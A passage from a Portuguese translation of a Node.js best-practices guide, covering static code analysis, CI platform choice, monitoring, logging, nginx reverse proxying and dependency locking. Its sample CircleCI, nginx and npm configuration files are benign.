<p><strong>TL;DR:</strong> O uso de ferramentas de análise estática ajuda fornecendo maneiras objetivas de melhorar a qualidade do código e manter seu código sustentável. Você pode adicionar ferramentas de análise estática para seu build de Integração Contínua (CI) falhar quando encontre code smells. Seus principais pontos de vantagem sobre o linting são a abilidade de inspecionar a qualidade no contexto de múltiplos arquivos (por exemplo, detectar duplicidades), realizar análises avançadas (por exemplo, complexidade de código), e acompanhar histórico e progresso de problemas de código. Dois dexemplos de ferramentas que podem ser utilizadas são <a href="https://www.sonarqube.org/" target="_blank" rel="nofollow noopener noreferrer">Sonarqube</a> (mais de 2.600 <a href="https://github.com/SonarSource/sonarqube" target="_blank" rel="nofollow noopener noreferrer">stars</a>) e <a href="https://codeclimate.com/" target="_blank" rel="nofollow noopener noreferrer">Code Climate</a> (mais de 1.500 <a href="https://github.com/codeclimate/codeclimate" target="_blank" rel="nofollow noopener noreferrer">stars</a>).</p>
<p><strong>Caso contrário:</strong> Com qualidade de código ruim, bugs e desempenho sempre serão um problema que nenhuma nova biblioteca maravilhosa ou recursos de última geração podem corrigir.</p>
<h1>Refatorando</h1>
<h3>Explicação em um Parágrafo</h3>
<p>A refatoração é um processo importante no fluxo de desenvolvimento iterativo. Remover “Code Smells” (más práticas de codificação) como código duplicado, métodos longos e lista de parâmetros extensa, irá melhorar o seu código e torná-lo mais sustentável. O uso de ferramentas de análise estática ajudará você a encontrar essas más práticas de código e criará um processo em torno da refatoração. Adicionar essas ferramentas à sua configuração de CI (Integração Contínua) ajudará a automatizar o processo de verificação de qualidade. Se o seu CI se integrar a uma ferramenta como o Sonar ou o Code Climate, a compilação falhará se detectar más práticas de código e informará o autor sobre como resolver o problema. Essas ferramentas de análise estática complementarão as ferramentas de lint, como o ESLint. A maioria das ferramentas de lint se concentrará em estilos de código como recuo e ponto-e-vírgulas ausentes (embora alguns encontrem más práticas de código como funções longas) em um único arquivo, enquanto ferramentas de análise estática se concentrarão em encontrar más práticas de código (código duplicado, análise de complexidade etc.) que estão em um único arquivo ou vários arquivos.</p>
<h3>Martin Fowler - Cientista Chefe na ThoughtWorks</h3>
<p> Do livro, “Refactoring - Improving the Design of Existing Code”</p>
<blockquote>
<p>A refatoração é uma técnica controlada para melhorar o design de uma base de código existente.</p>
</blockquote>
<h3>Evan Burchard - Consultor de Desenvolvimento Web e Autor</h3>
<p> Do livro, “Refactoring JavaScript: Turning Bad Code into Good Code”</p>
<blockquote>
<p>Não importa qual framework ou linguagem que “Compila-para-JS” ou biblioteca que você usa, bugs e preocupações de desempenho serão sempre um problema se a qualidade subjacente do seu JavaScript for ruim.</p>
</blockquote>
<h3>Exemplo: Análise de métodos complexos com CodeClimate (comercial)</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/codeanalysis-climate-complex-methods.PNG?raw=true" alt="alt text" title="Análise de métodos complexos"></p>
<h3>Exemplo: tendências de análise de código e histórico com CodeClimate (comercial)</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/codeanalysis-climate-history.PNG?raw=true" alt="alt text" title="Histórico de análise de código"></p>
<h3>Exemplo: Resumo de análise de código e tendências com o SonarQube (comercial)</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/codeanalysis-sonarqube-dashboard.PNG?raw=true" alt="alt text" title="Histórico de análise de código"></p>
<h2>4.11 Escolha cuidadosamente sua plataforma de Integração Contínua - CI (Jenkins vs CircleCI vs Travis vs Resto do mundo)</h2>
<p><strong>TL;DR:</strong> Sua plataforma de integração contínua (CICD) irá hospedar todas as ferramentas de qualidade (por exemplo, teste, lint), então ela deve vir com um ecosistema de plugins arrebatador. O <a href="https://jenkins.io/" target="_blank" rel="nofollow noopener noreferrer">Jenkins</a> costumava ser o padrão de muitos projetos, pois tem a maior comunidade, juntamente com uma poderosa plataforma, ao preço de configuração complexa que exige uma curva de aprendizado íngreme. Atualmente, ficou bem mais fácil para configurar uma solução de CI usando ferramentas SaaS como <a href="https://circleci.com" target="_blank" rel="nofollow noopener noreferrer">CircleCI</a> e outras. Essas ferramentas permitem a criação de um pipeline de CI flexível sem o peso de gerenciar toda a infraestrutura. Eventualmente, é um perde e ganha entre robustez e velocidade - escolha seu lado com cuidado!</p>
<p><strong>Caso contrário:</strong> Escolher algum fornecedor de nicho pode fazer com que você fique engessado quando precisar de alguma personalização avançada. Por outro lado, escolher o Jenkins pode ser uma perda de tempo precioso na configuração da infraestrutura.</p>
<h1>Escolha cuidadosamente sua plataforma de Integração Contínua</h1>
<h3>Explicação em um Parágrafo</h3>
<p>O mundo da CI costumava ser a flexibilidade de <a href="https://jenkins.io/" target="_blank" rel="nofollow noopener noreferrer">Jenkins</a> versus a simplicidade dos fornecedores de SaaS. O jogo está mudando agora, já que os provedores de SaaS como <a href="https://circleci.com/" target="_blank" rel="nofollow noopener noreferrer">CircleCI</a> e <a href="https://travis-ci.org/" target="_blank" rel="nofollow noopener noreferrer">Travis</a> oferecem soluções robustas, incluindo contêineres Docker com tempo mínimo de configuração, enquanto Jenkins tenta competir no segmento de ‘simplicidade’ também. Embora seja possível configurar uma solução de CI avançada na nuvem, caso seja necessário controlar os detalhes mais precisos, a Jenkins ainda é a plataforma preferida. A escolha acaba por reduzir até que ponto o processo de CI deve ser personalizado: os fornecedores de nuvem gratuitos e sem configuração permitem executar comandos de shell personalizados, imagens docker personalizadas, ajustar o fluxo de trabalho, executar compilações de matriz e outros recursos avançados. No entanto, se for desejado controlar a infraestrutura ou programar a lógica de CI usando uma linguagem de programação formal, como Java, talvez ainda seja possível escolher Jenkins. Caso contrário, considere optar pela opção de nuvem simples e sem configuração.</p>
<h3>Exemplo de código - uma configuração típica de IC na nuvem. Único arquivo .yml e é isso</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript">version<span class="token operator">:</span> <span class="token number">2</span>
jobs<span class="token operator">:</span>
  build<span class="token operator">:</span>
    docker<span class="token operator">:</span>
      <span class="token operator">-</span> image<span class="token operator">:</span> circleci<span class="token operator">/</span>node<span class="token operator">:</span><span class="token number">4.8</span><span class="token number">.2</span>
      <span class="token operator">-</span> image<span class="token operator">:</span> mongo<span class="token operator">:</span><span class="token number">3.4</span><span class="token number">.4</span>
    steps<span class="token operator">:</span>
      <span class="token operator">-</span> checkout
      <span class="token operator">-</span> run<span class="token operator">:</span>
          name<span class="token operator">:</span> Install npm wee
          command<span class="token operator">:</span> npm install
  test<span class="token operator">:</span>
    docker<span class="token operator">:</span>
      <span class="token operator">-</span> image<span class="token operator">:</span> circleci<span class="token operator">/</span>node<span class="token operator">:</span><span class="token number">4.8</span><span class="token number">.2</span>
      <span class="token operator">-</span> image<span class="token operator">:</span> mongo<span class="token operator">:</span><span class="token number">3.4</span><span class="token number">.4</span>
    steps<span class="token operator">:</span>
      <span class="token operator">-</span> checkout
      <span class="token operator">-</span> run<span class="token operator">:</span>
          name<span class="token operator">:</span> Test
          command<span class="token operator">:</span> npm test
      <span class="token operator">-</span> run<span class="token operator">:</span>
          name<span class="token operator">:</span> Generate code coverage
          command<span class="token operator">:</span> <span class="token string">'./node_modules/.bin/nyc report --reporter=text-lcov'</span>      
      <span class="token operator">-</span> store_artifacts<span class="token operator">:</span>
          path<span class="token operator">:</span> coverage
          prefix<span class="token operator">:</span> coverage</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Circle CI - CI com quase zero configuração em nuvem</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/circleci.png?raw=true" alt="alt text" title="manipulador de erros do API"></p>
<h3>Jenkins - CI sofisticado e robusto</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/jenkins_dashboard.png?raw=true" alt="alt text" title="manipulador de erros do API"></p>
<h1><code class="language-text">5. Boas Práticas de Produção</code></h1>
<h2>5.1. Monitoramento!</h2>
<p><strong>TL;DR:</strong> O monitoramento é um jogo de descobrir problemas antes que os clientes os encontrem - obviamente deve ser atribuída muita importância para isto. O mercado está sobrecarregado de ofertas, portanto, considere começar com a definição das métricas básicas que você deve seguir (sugestões minhas dentro), depois passe por recursos extras e escolha a solução que marca todas as caixas. Acesse o ‘Gist’ abaixo para uma visão geral das soluções.</p>
<p><strong>Caso contrário:</strong> Falha === clientes desapontados. Simples</p>
<h1>Monitoramento!</h1>
<h3>Explicação em um Parágrafo</h3>
<p>No nível básico, monitoramento significa que você pode <em>facilmente</em> identificar quando coisas ruins acontecem na produção. Por exemplo, ao ser notificado por email ou Slack. O desafio é escolher o conjunto certo de ferramentas que satisfarão suas necessidades sem quebrar seu banco. Posso sugerir, comece definindo o conjunto principal de métricas que devem ser observadas para garantir um estado íntegro - CPU, RAM do servidor, RAM do processo do Node (menos de 1,4 GB), o número de erros no último minuto, o número de reinícios do processo, tempo médio de resposta. Em seguida, analise alguns recursos avançados que você pode gostar e adicione-os à sua lista de desejos. Alguns exemplos de um recurso de monitoramento de luxo: criação de perfil de banco de dados, medição de serviço cruzado (isto é, medição de transação comercial), integração front-end, expor dados brutos a clientes de BI personalizados, notificações do Slack e muitos outros.</p>
<p>Atingir os recursos avançados exige uma configuração demorada ou a compra de um produto comercial como Datadog, NewRelic e similares. Infelizmente, alcançar até mesmo o básico não é um passeio no parque, pois algumas métricas são relacionadas ao hardware (CPU) e outras vivem dentro do processo do Node (erros internos), portanto, todas as ferramentas simples requerem alguma configuração adicional. Por exemplo, soluções de monitoramento de fornecedores de nuvem (por exemplo, <a href="https://aws.amazon.com/cloudwatch/" target="_blank" rel="nofollow noopener noreferrer">AWS CloudWatch</a>, <a href="https://cloud.google.com/stackdriver/" target="_blank" rel="nofollow noopener noreferrer">Google StackDriver</a>) informarão imediatamente sobre as métricas de hardware, mas não sobre o comportamento interno da aplicação. Por outro lado, soluções baseadas em log, como o ElasticSearch, não possuem a visualização de hardware por padrão. A solução é aumentar sua escolha com métricas ausentes, por exemplo, uma opção popular é enviar logs de aplicativos para o <a href="https://www.elastic.co/products" target="_blank" rel="nofollow noopener noreferrer">Elastic stack</a> e configurar alguns agentes adicionais (por exemplo, <a href="https://www.elastic.co/products" target="_blank" rel="nofollow noopener noreferrer">Beat</a>) para compartilhar informações relacionadas ao hardware para obter a imagem completa.</p>
<h3>Exemplo de monitoramento: painel padrão do AWS cloudwatch. Difícil de extrair métricas na aplicação</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/monitoring1.png?raw=true" alt="Painel padrão do AWS cloudwatch. Difícil de extrair métricas na aplicação"></p>
<h3>Exemplo de monitoramento: painel padrão do StackDriver. Difícil de extrair métricas na aplicação</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/monitoring2.jpg?raw=true" alt="Painel padrão do StackDriver. Difícil de extrair métricas na aplicação"></p>
<h3>Exemplo de monitoramento: Grafana como camada de interface do usuário que visualiza dados brutos</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/monitoring3.png?raw=true" alt="Grafana como camada de interface do usuário que visualiza dados brutos"></p>
<h3>O que Outros Blogueiros Dizem</h3>
<p>Do blog <a href="http://mubaloo.com/best-practices-deploying-node-js-applications/" target="_blank" rel="nofollow noopener noreferrer">Rising Stack</a>:</p>
<blockquote>
<p>…Recomendamos que você observe esses sinais para todos os seus serviços:
Taxa de erros: porque os erros são enfrentados pelo usuário e afetam imediatamente seus clientes.
Tempo de resposta: porque a latência afeta diretamente seus clientes e negócios.
Taxa de transferência: o tráfego ajuda você a entender o contexto de taxas de erro aumentadas e a latência também.
Saturação: Diz quão “completo” é o seu serviço. Se o uso da CPU for de 90%, seu sistema pode lidar com mais tráfego? …</p>
</blockquote>
<h2>5.2. Aumente a transparência usando smart logging</h2>
<p><strong>TL;DR:</strong> Logs podem ser um armazém inútil de instruções de debug ou o ativador de um belo dashboard que conta a história do seu app. Planeje sua plataforma de logs desde o primeiro dia: como os logs são coletados, armazenados e analisados para ter certeza de que as informações desejadas possam realmente ser extraídas, por exemplo, a avaliação de erro, após uma transação inteira através de serviços e servidores, etc.</p>
<p><strong>Caso contrário:</strong> Você acaba com uma caixa preta que é difícil de raciocinar, então você começa a reescrever todas as declarações de log para adicionar informações adicionais.</p>
<h1>Aumente a transparência usando smart logging</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Já que você imprime declarações de log de qualquer maneira e obviamente precisa de alguma interface que envolva informações de produção nas quais possa rastrear erros e métricas principais (por exemplo, quantos erros ocorrem a cada hora e qual é o ponto final da API mais lento) por que não investir algum esforço em uma estrutura de registro robusta que satisfará todos requisitos? Conseguir isso requer uma decisão ponderada em três etapas:</p>
<p><strong>1. logging inteligente</strong> – no mínimo, você precisa usar uma biblioteca de registro respeitável como <a href="https://github.com/winstonjs/winston" target="_blank" rel="nofollow noopener noreferrer">Winston</a>, <a href="https://github.com/trentm/node-bunyan" target="_blank" rel="nofollow noopener noreferrer">Bunyan</a> e escreva informações significativas em cada início e fim de transação. Considere também formatar instruções de log como JSON e fornecer todas as propriedades contextuais (por exemplo, ID de usuário, tipo de operação, etc.) para que a equipe de operações possa atuar nesses campos. Inclua também um ID de transação exclusivo em cada linha de registro. Para obter mais informações, consulte o marcador abaixo “Escrever ID de transação para registrar”. Um último ponto a considerar também é incluir um agente que registre os recursos do sistema, como memória e CPU, por exemplo o Elastic Beat.</p>
<p><strong>2. agregação inteligente</strong> – depois de obter informações abrangentes sobre o sistema de arquivos dos servidores, é hora de enviá-las periodicamente para um sistema que agrega, facilita e visualiza esses dados. O stack Elastic, por exemplo, é uma escolha popular e gratuita que oferece todos os componentes para agregar e visualizar dados. Muitos produtos comerciais fornecem funcionalidade semelhante apenas reduzem significativamente o tempo de configuração e não requerem hospedagem.</p>
<p><strong>3. visualização inteligente</strong> – agora as informações são agregadas e pesquisáveis, uma pessoa pode ficar satisfeita apenas com o poder de pesquisar facilmente os logs, mas isso pode ir muito além sem codificar ou gastar muito esforço. Agora, podemos mostrar métricas operacionais importantes, como taxa de erros, CPU média ao longo do dia, quantos novos usuários optaram por participar na última hora e qualquer outra métrica que ajude a gerenciar e melhorar nossa aplicação.</p>
<h3>Exemplo de visualização: Kibana (parte do stack Elastic) facilita a pesquisa avançada no conteúdo do log</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/smartlogging1.png?raw=true" alt="Kibana facilita a pesquisa avançada no conteúdo do log" title="Kibana facilita a pesquisa avançada no conteúdo do log"></p>
<h3>Exemplo de visualização: Kibana (parte do stack Elastic) visualiza dados com base em logs</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/smartlogging2.jpg?raw=true" alt="Kibana visualiza dados com base em logs" title="Kibana visualiza dados com base em logs"></p>
<h3>Citações de Blog: Requisitos do Logger</h3>
<p>Do blog <a href="https://strongloop.com/strongblog/compare-node-js-logging-winston-bunyan/" target="_blank" rel="nofollow noopener noreferrer">Strong Loop</a>:</p>
<blockquote>
<p>Vamos identificar alguns requisitos (para um logger):</p>
<ol>
<li>Carimbo de data/hora de cada linha de log. Este é bastante auto-explicativo - você deve ser capaz de dizer quando cada entrada de log ocorreu.</li>
<li>Formato de registro deve ser facilmente entendido por seres humanos, bem como máquinas.</li>
<li>Permite múltiplos fluxos de destino configuráveis. Por exemplo, você pode estar gravando logs de rastreio em um arquivo, mas quando um erro é encontrado, grava no mesmo arquivo, depois no arquivo de erro e envia um email ao mesmo tempo…</li>
</ol>
</blockquote>
<h2>5.3. Delegue tudo o que for possível (por exemplo, gzip, SSL) a um proxy reverso</h2>
<p><strong>TL;DR:</strong> O Node é terrivelmente ruim em fazer tarefas intensas de CPU como gzipping, SSL termination, etc. Você deve usar serviços de middleware “reais” como nginx, HAproxy ou serviços de nuvem.</p>
<p><strong>Caso contrário:</strong> Seu único e pobre thread permanecerá ocupado fazendo tarefas de infra-estrutura em vez de lidar com o núcleo da sua aplicação e o desempenho certamente será degradado.</p>
<h1>Delegue tudo o que for possível (por exemplo, gzip, SSL) a um proxy reverso</h1>
<h3>Explicação em um Parágrafo</h3>
<p>É muito tentador carregar o Express e usar suas várias opções de middleware para tarefas relacionadas à rede, como servir arquivos estáticos, codificação gzip, solicitações de limitação, terminação SSL etc. Isso é uma perda de desempenho devido ao seu modelo de thread único que manterá a CPU ocupada por longos períodos (Lembre-se, o modelo de execução do Node é otimizado para tarefas curtas ou tarefas relacionadas a IO assíncrono). Uma abordagem melhor é usar uma ferramenta especializada em tarefas de rede - os mais populares são o nginx e o HAproxy, que também são usados ​​pelos maiores fornecedores de nuvem para aliviar a carga recebida nos processos node.js.</p>
<h3>Exemplo de configuração do Nginx - usando o nginx para compactar as respostas do servidor</h3>
<div class="gatsby-highlight" data-language="nginx"><pre style="counter-reset: linenumber NaN" class="language-nginx line-numbers"><code class="language-nginx"><span class="token comment"># configurar compactação gzip</span>
<span class="token keyword">gzip</span> on<span class="token punctuation">;</span>
<span class="token keyword">gzip_comp_level</span> <span class="token number">6</span><span class="token punctuation">;</span>
<span class="token keyword">gzip_vary</span> on<span class="token punctuation">;</span>

<span class="token comment"># configurar upstream</span>
<span class="token keyword">upstream</span> myApplication <span class="token punctuation">{</span>
    <span class="token keyword">server</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">3000</span><span class="token punctuation">;</span>
    <span class="token keyword">server</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">3001</span><span class="token punctuation">;</span>
    <span class="token keyword">keepalive</span> <span class="token number">64</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">#definindo servidor da web</span>
<span class="token keyword">server</span> <span class="token punctuation">{</span>
    <span class="token comment"># configurar servidor com páginas ssl e de erro</span>
    <span class="token keyword">listen</span> <span class="token number">80</span><span class="token punctuation">;</span>
    <span class="token keyword">listen</span> <span class="token number">443</span> <span class="token keyword">ssl</span><span class="token punctuation">;</span>
    <span class="token keyword">ssl_certificate</span> <span class="token operator">/</span>some<span class="token operator">/</span><span class="token keyword">location</span><span class="token operator">/</span>sillyfacesociety<span class="token punctuation">.</span>com<span class="token punctuation">.</span>bundle<span class="token punctuation">.</span>crt<span class="token punctuation">;</span>
    <span class="token keyword">error_page</span> <span class="token number">502</span> <span class="token operator">/</span>errors<span class="token operator">/</span><span class="token number">502.</span>html<span class="token punctuation">;</span>

    <span class="token comment"># lidando com conteúdo estático</span>
    <span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">^</span><span class="token operator">/</span><span class="token punctuation">(</span>images<span class="token operator">/</span><span class="token operator">|</span>img<span class="token operator">/</span><span class="token operator">|</span>javascript<span class="token operator">/</span><span class="token operator">|</span>js<span class="token operator">/</span><span class="token operator">|</span>css<span class="token operator">/</span><span class="token operator">|</span>stylesheets<span class="token operator">/</span><span class="token operator">|</span>flash<span class="token operator">/</span><span class="token operator">|</span>media<span class="token operator">/</span><span class="token operator">|</span>static<span class="token operator">/</span><span class="token operator">|</span>robots<span class="token punctuation">.</span>txt<span class="token operator">|</span>humans<span class="token punctuation">.</span>txt<span class="token operator">|</span>favicon<span class="token punctuation">.</span>ico<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">root</span> <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>silly_face_society<span class="token operator">/</span>node<span class="token operator">/</span>public<span class="token punctuation">;</span>
    <span class="token keyword">access_log</span> off<span class="token punctuation">;</span>
    <span class="token keyword">expires</span> max<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>O que Outros Blogueiros Dizem</h3>
<ul>
<li>
<p>Do blog <a href="http://mubaloo.com/best-practices-deploying-node-js-applications" target="_blank" rel="nofollow noopener noreferrer">Mubaloo</a>:</p>
<blockquote>
<p>…É muito fácil cair nessa armadilha - Você vê um pacote como o Express e pensa “Incrível! Vamos começar ”- você codifica e tem uma aplicação que faz o que você deseja. Isso é excelente e, para ser honesto, você ganhou muito da batalha. No entanto, você perderá a guerra se fizer o upload do seu aplicativo em um servidor e escutá-lo na porta HTTP, porque esqueceu uma coisa muito importante: o Node não é um servidor da web. <strong>Assim que qualquer volume de tráfego começar a bater em sua aplicação, você perceberá que as coisas começam a dar errado: as conexões são interrompidas, os recursos deixam de ser exibidos ou, no pior dos casos, o servidor falha. O que você está fazendo é tentar fazer com que o Node lide com todas as coisas complicadas que um servidor da Web comprovado faz muito bem. Por que reinventar a roda?</strong>
<strong>Isto é apenas para um pedido, para uma imagem e tendo em conta que esta é a memória que a sua aplicação poderia ser usada para coisas importantes como ler uma base de dados ou lidar com lógica complicada; por que você prejudicaria sua aplicação apenas por conveniência?</strong></p>
</blockquote>
</li>
<li>
<p>Do blog <a href="http://blog.argteam.com/coding/hardening-node-js-for-production-part-2-using-nginx-to-avoid-node-js-load" target="_blank" rel="nofollow noopener noreferrer">Argteam</a>:</p>
<blockquote>
<p>Embora o express.js tenha manipulação interna de arquivos estáticos através de algum middleware de conexão, você nunca deve usá-lo. <strong>O Nginx pode fazer um trabalho muito melhor ao lidar com arquivos estáticos e pode impedir que solicitações de conteúdo não dinâmico obstruam nossos processos do Node</strong>…</p>
</blockquote>
</li>
</ul>
<h2>5.4. Bloqueio de dependências</h2>
<p><strong>TL;DR:</strong> Seu código deve ser idêntico em todos os ambientes, mas, surpreendentemente, o npm permite que as dependências derivem entre os ambientes por padrão - quando você instala pacotes em vários ambientes, ele tenta buscar a versão mais recente dos pacotes. Supere isso usando arquivos de configuração do npm, .npmrc, que dirão a cada ambiente para salvar a versão exata (não a última) de cada pacote. Outra alternativa, para um controle melhor, use o “shirinkwrap” do npm. *Atualização: a partir do NPM5, as dependências são bloqueadas por padrão. O novo gerenciador de pacotes no pedaço, Yarn, também faz isso por padrão.</p>
<p><strong>Caso contrário:</strong> O QA testará completamente o código e aprovará uma versão que se comportará de maneira diferente na produção. Pior ainda, servidores diferentes no mesmo cluster de produção podem executar código diferente.</p>
<h1>Bloqueio de dependências</h1>
<h3>Explicação de um Parágrafo</h3>
<p>Seu código depende de muitos pacotes externos, digamos que ele “requeira” e use momentjs-2.1.4. Depois, por padrão, quando você implanta para produção, o npm pode buscar momentjs 2.1.5, o que infelizmente traz alguns novos bugs à aplicação. Usando os arquivos de configuração do npm e o argumento <code class="language-text">–save-exact = true</code> instrui o npm a se referir à <em>exata</em> versão que foi instalada, então da próxima vez que você executar <code class="language-text">npm install</code> (em produção ou dentro de um contêiner Docker que você planeja enviar para a frente para testes), a mesma versão dependente será buscada. Uma abordagem alternativa e popular é usar um arquivo <code class="language-text">.shrinkwrap</code> (gerado facilmente usando npm) que indica exatamente quais pacotes e versões devem ser instalados para que nenhum ambiente seja tentado a buscar versões mais novas do que o esperado.</p>
<ul>
<li><strong>Atualização:</strong> a partir do npm 5, as dependências são bloqueadas automaticamente usando .shrinkwrap. O Yarn, um gerenciador de pacotes emergente, também bloqueia dependências por padrão.</li>
</ul>
<h3>Exemplo de código: arquivo .npmrc que instrui o npm a usar as versões exatas</h3>
<div class="gatsby-highlight" data-language="npmrc"><pre style="counter-reset: linenumber NaN" class="language-npmrc line-numbers"><code class="language-npmrc">// salve isso como arquivo .npmrc no diretório do projeto
save-exact:true</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<h3>Exemplo de código: arquivo shrinkwrap.json que destila a árvore de dependência exata</h3>
<div class="gatsby-highlight" data-language="json"><pre style="counter-reset: linenumber NaN" class="language-json line-numbers"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"A"</span><span class="token punctuation">,</span>
    <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"B"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.0.1"</span><span class="token punctuation">,</span>
            <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token property">"C"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.1.0"</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Exemplo de código: npm 5 arquivo de bloqueio de dependências - package.json</h3>
<div class="gatsby-highlight" data-language="json"><pre style="counter-reset: linenumber NaN" class="language-json line-numbers"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"package-name"</span><span class="token punctuation">,</span>
    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>
    <span class="token property">"lockfileVersion"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
    <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"cacache"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"9.2.6"</span><span class="token punctuation">,</span>
            <span class="token property">"resolved"</span><span class="token operator">:</span> <span class="token string">"https://registry.npmjs.org/cacache/-/cacache-9.2.6.tgz"</span><span class="token punctuation">,</span>
            <span class="token property">"integrity"</span><span class="token operator">:</span> <span class="token string">"sha512-YK0Z5Np5t755edPL6gfdCeGxtU0rcW/DBhYhYVDckT+7AFkCCtedf2zru5NRbBLFk6e7Agi/RaqTOAfiaipUfg=="</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token property">"duplexify"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"3.5.0"</span><span class="token punctuation">,</span>
            <span class="token property">"resolved"</span><span class="token operator">:</span> <span class="token string">"https://registry.npmjs.org/duplexify/-/duplexify-3.5.0.tgz"</span><span class="token punctuation">,</span>
            <span class="token property">"integrity"</span><span class="token operator">:</span> <span class="token string">"sha1-GqdzAC4VeEV+nZ1KULDMquvL1gQ="</span><span class="token punctuation">,</span>
            <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token property">"end-of-stream"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>
                    <span class="token property">"resolved"</span><span class="token operator">:</span> <span class="token string">"https://registry.npmjs.org/end-of-stream/-/end-of-stream-1.0.0.tgz"</span><span class="token punctuation">,</span>
                    <span class="token property">"integrity"</span><span class="token operator">:</span> <span class="token string">"sha1-1FlucCc0qT5A6a+GQxnqvZn/Lw4="</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>5.5. Poupe tempo de atividade do processo usando a ferramenta certa</h2>
<p><strong>TL;DR:</strong> O processo deve continuar e ser reiniciado após falhas. Para cenários simples, as ferramentas de “reinicialização”, como PM2, podem ser suficientes. Entretanto, no mundo atual “dockerizado”, as ferramentas de gerenciamento de cluster também devem ser consideradas</p>
<p><strong>Caso contrário:</strong> Rodar dezenas de instâncias sem uma estratégia clara e muitas ferramentas juntas (gerenciamento de cluster, docker, PM2) pode levar o DevOps ao caos.</p>
<h1>Poupe tempo de atividade do processo usando a ferramenta certa</h1>
<h3>Explicação em um Parágrafo</h3>
<p>No nível base, os processos do Node devem ser protegidos e reiniciados após falhas. Simplificando, para aplicativos pequenos e para aqueles que não usam contêineres - ferramentas como <a href="https://www.npmjs.com/package/pm2-docker" target="_blank" rel="nofollow noopener noreferrer">PM2</a> são perfeitas, pois trazem simplicidade, reiniciando recursos e também uma rica integração com o Node. Outros com fortes habilidades em Linux podem usar o systemd e executar o Node como um serviço. As coisas ficam mais interessantes para aplicativos que usam o Docker ou qualquer outra tecnologia de contêineres, pois geralmente são acompanhados por ferramentas de gerenciamento e orquestração de clusters (por exemplo, <a href="http://docs.aws.amazon.com/AmazonECS/latest/developerguide/Welcome" target="_blank" rel="nofollow noopener noreferrer">AWS ECS</a>), <a href="https://kubernetes.io/" target="_blank" rel="nofollow noopener noreferrer">Kubernetes</a>, etc) que implantam, monitoram e curam contêineres. Com todos esses recursos avançados de gerenciamento de cluster, incluindo reinício do contêiner, por que mexer com outras ferramentas como o PM2? Não há resposta à prova de balas. Há boas razões para manter 